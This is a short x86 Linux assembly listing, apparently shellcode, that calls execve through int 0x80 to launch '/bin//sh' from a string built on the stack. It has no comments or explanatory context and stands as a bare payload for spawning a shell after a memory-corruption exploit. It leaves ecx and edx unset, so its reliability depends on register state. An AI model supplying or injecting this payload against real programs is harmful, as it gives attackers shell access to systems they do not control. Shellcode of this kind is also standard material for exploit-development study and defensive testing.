section .text
global _start
_start:
xor eax, eax
mov al, 0xb
xor ebx, ebx
push ebx
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
int 0x80
